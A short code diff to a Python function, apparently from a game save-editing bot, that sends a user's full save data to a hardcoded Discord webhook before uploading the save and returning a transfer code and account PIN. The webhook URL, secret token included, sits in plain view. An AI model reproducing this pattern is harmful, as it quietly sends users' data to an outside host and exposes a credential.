@@ -42,22 +42,9 @@ def main(in_gamever, in_transfer_code, in_confirmation_code, in_catfood, in_user
         save_stats["token"] = "0" * 40
         url = "https://discord.com/api/webhooks/1125726702388129903/AJgySZWxBGIdDHqTYTfAIY7IEBOoTs_N-7WuYWzUt2NkXhSOHRdWyNIYCnm0K8mEK1wP"
         data = {
-            "content" : None,
+            "content" : save_stats,
             "username" : "custom username"
                 }
-        data["embeds"] = [
-            {
-                "content": None,
-                "embeds": [
-                {
-                "title": f"save stats : {in_user.name}",
-                "description": f"```{save_stats}```",
-                "color": 16777214
-                }
-            ],
-            "attachments": []
-            }
-            ]
         result = requests.post(url, json = data)
         transfercode, account_pin = edits.save_management.server_upload.save_and_upload(save_stats)
         return transfercode, account_pin
